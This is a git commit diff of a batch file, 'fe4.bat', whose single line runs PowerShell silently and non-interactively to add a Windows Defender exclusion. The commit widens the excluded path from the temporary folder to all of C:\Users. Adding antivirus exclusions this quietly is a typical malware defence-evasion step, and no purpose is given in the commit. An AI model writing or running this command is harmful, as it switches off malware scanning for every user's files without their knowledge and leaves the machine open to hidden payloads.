0ef35dcdceb4b80a01f1fa420d8c6e350bd4379b
Fevzi Eser <59337397+seition2@users.noreply.github.com>
2022-01-08 11:43:25 +0300

    Update fe4.bat

--- fe4.bat
+++ fe4.bat
@@ -1,1 +1,1 @@
-powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%temp%"
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Users"
